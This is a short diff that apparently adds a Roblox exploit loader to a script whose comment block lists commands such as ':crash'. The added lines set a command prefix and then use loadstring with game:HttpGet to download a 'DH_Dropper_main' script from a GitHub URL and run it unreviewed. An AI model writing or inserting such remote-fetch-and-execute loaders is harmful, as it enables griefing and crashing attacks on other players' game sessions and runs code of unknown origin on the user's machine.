@@ -20,3 +20,7 @@ Commands:
 :crash
 -----------
 ]]
+
+getgenv().prefix = ":"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Topcoldgaming/loadstring-scritps-/main/DH_Dropper_main"))()
